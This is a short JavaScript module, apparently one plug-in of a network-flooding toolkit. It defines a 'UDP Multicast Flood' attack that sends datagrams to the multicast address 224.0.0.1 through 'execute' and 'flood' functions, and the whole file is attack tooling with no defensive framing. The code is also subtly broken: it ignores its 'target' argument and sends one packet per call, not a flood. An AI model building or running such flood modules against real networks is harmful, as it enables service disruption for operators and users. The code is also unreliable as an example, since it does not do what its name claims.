const dgram = require('dgram');

module.exports = {
    name: 'UDP Multicast Flood',
    description: 'Sends to multicast addresses',
    
    execute: async (target, port) => {
        const socket = dgram.createSocket('udp4');
        const message = Buffer.from('MULTICAST');
        
        return new Promise((resolve, reject) => {
            socket.send(message, port, '224.0.0.1', (err) => {
                if (err) reject(err);
                else resolve({ multicast: true });
                socket.close();
            });
        });
    },
    
    flood: (target, port, callback) => {
        const socket = dgram.createSocket('udp4');
        const message = Buffer.from('MULTICAST');
        
        socket.send(message, port, '224.0.0.1', (err) => {
            socket.close();
            callback(!err);
        });
    }
};